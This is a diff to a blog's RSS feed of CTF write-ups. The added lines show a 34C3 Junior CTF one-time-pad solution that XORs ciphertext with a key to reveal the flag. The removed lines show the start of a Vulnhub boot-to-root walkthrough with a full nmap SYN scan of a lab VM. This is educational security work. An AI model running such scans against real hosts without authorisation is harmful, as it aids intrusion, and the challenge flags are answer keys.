class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;217&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;225&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;170&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;223&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;154&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;203&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;171&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;237&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;196&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;154&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;228&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This is our key. Now let’s write a script that will &lt;strong&gt;&lt;em&gt;xor&lt;/em&gt;&lt;/strong&gt; values of the message and the key.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x09&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x94&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xBB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x49&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xE3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xBF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xB4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;202&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;208&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;169&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;229&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;247&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;145&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;217&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;225&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;170&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;194&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;223&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;154&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;203&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;171&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;195&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;237&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;196&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;154&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;228&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And here’s our flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;34C3_otp_top_pto_pot_tpo_opt_wh0_car3s&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+        <pubDate>Fri, 29 Dec 2017 21:00:00 +0000</pubDate>
+        <link>http://localhost:4000/34c3ctf-junior-top/</link>
+        <guid isPermaLink="true">http://localhost:4000/34c3ctf-junior-top/</guid>
+      </item>
+    
+      <item>
+        <title>34C3 Junior CTF - upload</title>
+        <description>&lt;p&gt;Today we’re going to look into one of the challenges from &lt;strong&gt;&lt;em&gt;34C3 Junior CTF&lt;/em&gt;&lt;/strong&gt;  called &lt;strong&gt;&lt;em&gt;upload&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Category: web&lt;/li&gt;
   &lt;li&gt;Difficulty: easy&lt;/li&gt;
@@ -97,8 +190,8 @@ We added a flag for your convenience.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
         <pubDate>Thu, 28 Dec 2017 21:00:00 +0000</pubDate>
-        <link>http://localhost:4000/34c4ctf-junior-upload/</link>
-        <guid isPermaLink="true">http://localhost:4000/34c4ctf-junior-upload/</guid>
+        <link>http://localhost:4000/34c3ctf-junior-upload/</link>
+        <guid isPermaLink="true">http://localhost:4000/34c3ctf-junior-upload/</guid>
       </item>
     
       <item>
@@ -1188,596 +1281,6 @@ FLAG : 22d06624cd604a0626eb5a2992a6f2e6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Sat, 18 Nov 2017 08:00:00 +0000</pubDate>
         <link>http://localhost:4000/vulnhub-dina/</link>
         <guid isPermaLink="true">http://localhost:4000/vulnhub-dina/</guid>
-      </item>
-    
-      <item>
-        <title>Vulnhub.com - Rickdiculously Easy 1</title>
-        <description>&lt;p&gt;With some time between lectures, I decided to try out some new machines from Vulnhub - in particular the one called &lt;strong&gt;RickdiculouslyEasy&lt;/strong&gt; as it seems to be really fun.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This is a fedora server vm, created with virtualbox.
-
-It is a very simple Rick and Morty themed boot to root.
-
-There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.
-
-It's designed to be a beginner ctf, if you're new to pen testing, check it out!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/luke,562/&quot;&gt;&lt;b&gt;Luke&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Download: &lt;a href=&quot;https://download.vulnhub.com/rickdiculouslyeasy/RickdiculouslyEasy.zip&quot;&gt;&lt;b&gt;RickdiculouslyEasy&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;write-up&quot;&gt;Write-Up&lt;/h1&gt;
-
-&lt;p&gt;Attacker: Kali Linux &lt;strong&gt;10.0.2.4&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Victim: RickdiculouslyEasy &lt;strong&gt;10.0.2.15&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;As always let’s start by scanning the machine using &lt;strong&gt;nmap&lt;/strong&gt;. This time I’m going to let it run a little longer, as I know that there are often hidden ports outside the default port range of nmap.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.15
-
-Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-11-01 05:24 EDT
-NSE: Loaded 146 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 05:24
-Completed NSE at 05:24, 0.00s elapsed
-Initiating NSE at 05:24
-Completed NSE at 05:24, 0.00s elapsed
-Initiating ARP Ping Scan at 05:24
-Scanning 10.0.2.15 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
-Completed ARP Ping Scan at 05:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Parallel DNS resolution of 1 host. at 05:24
-Completed Parallel DNS resolution of 1 host. at 05:24, 0.01s elapsed
-Initiating SYN Stealth Scan at 05:24
-Scanning 10.0.2.15 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.0.2.15
-Discovered open port 21/tcp on 10.0.2.15
-Discovered open port 80/tcp on 10.0.2.15
-Discovered open port 60000/tcp on 10.0.2.15
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15 from 0 to 5 due to max_successful_tryno increase to 5
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.15 from 5 to 10 due to 23 out of 57 dropped probes since last increase.
-SYN Stealth Scan Timing: About 11.24% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:05 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Discovered open port 9090/tcp on 10.0.2.15
-SYN Stealth Scan Timing: About 13.29% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:38 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 15.35% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:22 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 17.42% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:34 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Warning: 10.0.2.15 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-SYN Stealth Scan Timing: About 19.23% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:34 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SYN Stealth Scan Timing: About 20.90% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 05:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:25 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
